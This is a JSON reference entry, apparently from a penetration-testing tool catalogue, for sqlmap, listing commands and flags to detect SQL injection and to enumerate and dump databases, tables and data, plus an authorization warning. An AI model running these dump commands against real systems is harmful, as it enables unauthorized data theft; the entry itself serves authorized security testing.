    {
      "name": "sqlmap",
      "category": "pentest",
      "description": "Automatic SQL injection and database takeover tool.",
      "install": "sudo apt install sqlmap",
      "commands": [
        {"task": "basic GET injection test", "command": "sqlmap -u 'http://<target>/page.php?id=1'", "description": "Test a GET parameter for SQL injection."},
        {"task": "test POST parameter", "command": "sqlmap -u 'http://<target>/login' --data='user=admin&pass=test'", "description": "Test a POST form for SQL injection."},
        {"task": "dump database", "command": "sqlmap -u 'http://<target>/page.php?id=1' --dbs", "description": "List databases."},
        {"task": "dump tables", "command": "sqlmap -u 'http://<target>/page.php?id=1' -D <db_name> --tables", "description": "List tables in a database."},
        {"task": "dump data", "command": "sqlmap -u 'http://<target>/page.php?id=1' -D <db_name> -T <table> --dump", "description": "Dump data from a specific table."}
      ],
      "flags": [
        {"flag": "-u", "description": "Target URL", "example": "-u 'http://target/page.php?id=1'"},
        {"flag": "--data", "description": "POST data", "example": "--data='user=admin'"},
        {"flag": "--dbs", "description": "List databases"},
        {"flag": "-D", "description": "Database name", "example": "-D mydb"},
        {"flag": "--tables", "description": "List tables"},
        {"flag": "-T", "description": "Table name", "example": "-T users"},
        {"flag": "--dump", "description": "Dump table contents"},
        {"flag": "--batch", "description": "Run with default answers"}
      ],
      "examples": [
        "sqlmap -u 'http://10.0.0.1/news.php?id=1' --batch",
        "sqlmap -u 'http://10.0.0.1/login' --data='user=admin&pass=admin' --dbs"
      ],
      "safety_notes": "SQL injection attacks are illegal without explicit written authorization. Use only on systems you own or are permitted to test."
